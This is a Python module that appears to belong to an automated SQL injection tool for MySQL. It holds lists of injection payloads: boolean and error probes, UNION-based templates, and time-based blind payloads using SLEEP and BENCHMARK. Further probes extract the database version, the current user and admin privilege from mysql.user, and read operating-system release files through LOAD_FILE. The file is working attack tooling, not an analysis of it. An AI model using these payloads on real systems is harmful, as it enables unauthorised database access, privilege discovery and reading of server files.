import os
from sql import Select, Loadfile

## INJECTION_TESTS = [
##     ("injections", ["1 and 1", "1 and 1#",
##                     "1 and 0", "10 and 1", "10 and 0"]),
##     ("numbers", [0, 1, 10, 100]),
##     ("errors", ['0x', "0'", '0"', "1x", "1'", '1"']),
##     ("blind injections", ["1 and sleep(10)", "1 and benchmark(1000000,md5(0))"]),
##     ]

CHECKS = [
    # master, {same: similar pages, different: error pages or such}
    {'title':'numbers', 'trigger':'numbers',
     'master':"1",
     'same':["1 and 1",
             "(2 and 1)",
             #"(1 and 1)",
             #"(1 or 1)"
             ],
     'different':["1 and 0",
                  "1+1",
                  "2",
                  #"2 and 2",
                  #"2 and 0",
                  ],
     'extra':["1#", "1)#", "1)) #"]},
    {'title':'blind injections', 'trigger':'blinds',
     'master':"1",
     'extra':["1 and sleep(5)", "(1 and sleep(5))", "1) and sleep(5)",
              "1 and benchmark(100000,md5(0)"]}
    ]

DEFAULT_CONFIGFILE = os.path.join(os.getenv("HOME"), ".sqloff.pk")

UNION_TEST_FORMATS = [
    "0 UNION (%s) #",
    "0 UNION %s #",
    "0' union %s #",
    '0" union %s #',
    "0) UNION %s #",
    "0)) UNION %s #",
    ]
BLIND_TEST_FORMATS = [
    "1-(%s))#",
    "(1 AND (%s))",
    "1 AND (%s)",
    "1 AND (%s))#",
    ]
BLIND_SLEEP_FORMATS = [
    "if(%s,SLEEP(%d),0)",
    "%s AND SLEEP(%.2f)",
    "%s AND SLEEP(%d)",
    "%s AND BENCHMARK(%d00000, md5(md5(0)))",
    ]

OS_FILES = [
    ("Novell SuSE", ["/etc/SuSE-release"]),
    ("Red Hat", ["/etc/redhat-release", "/etc/redhat_version"]),
    ("Fedora", ["/etc/fedora-release"]),
    ("Slackware", ["/etc/slackware-release", "/etc/slackware-version"]),
    ("Debian", ["/etc/debian_release", "/etc/debian_version"]),
    ("Mandrake", ["/etc/mandrake-release"]),
    ("Yellow dog", ["/etc/yellowdog-release"]),
    ("Sun JDS", ["/etc/sun-release "]),
    ("Solaris/Sparc", ["/etc/release "]),
    ("Gentoo", ["/etc/gentoo-release"]),
    ]

PROBES = [
    ("MySQL Version", Select.parse("@@VERSION")),
    ("MySQL database", Select.parse("database()")),
    ("MySQL user", Select.parse("current_user()")),
    ("MySQL is admin", Select.parse("super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), 0x40, 1)) LIMIT 0, 1")),
    #("MySQL first user", Select.parse("user from mysql.user limit 1")),
    ]

for name, files in OS_FILES:
    for i, filename in enumerate(files):
        if len(files)>1:
            n = "%s %d (%s)" % (name, i+1, filename)
        else:
            n = "%s (%s)" % (name, filename)
            
        PROBES.append((n, Select.parse(Loadfile(filename))))
    
        
